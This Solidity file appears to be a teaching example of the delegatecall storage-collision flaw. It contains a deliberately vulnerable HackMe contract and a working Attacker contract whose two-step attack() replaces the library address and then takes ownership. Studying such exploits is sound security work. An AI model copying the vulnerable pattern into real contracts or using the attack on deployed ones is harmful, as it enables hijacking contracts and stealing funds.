// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.7.6;

// it's important to maintain order of variables while deligating call

contract HackMe {
    address lib;
    address public owner;
    uint someNumber;

    constructor(address _lib) {
        owner = msg.sender;
        lib = _lib;
    }

    function doStuff(uint _num) public {
        lib.delegatecall(abi.encodeWithSignature("doStuff(uint256)", _num));
    }
}

contract Lib {
    uint someNumber;

    function doStuff(uint _num) public {
        someNumber = _num;
    }
}

contract Attacker {
    address Lib;
    address public owner;
    uint someNumber;

    HackMe hackMe;

    constructor(address _hackMe) {
        hackMe = HackMe(_hackMe);
    }

    function attack() external {
        hackMe.doStuff(uint(address(this)));  // -------- (I)
        hackMe.doStuff(1);  // -------- (II)
    }

    function doStuff(uint _num) public { // HackMe will delegatecall this when (II) gets execute after (I)
        owner = msg.sender; // updates owner of HackMe 
    }
}
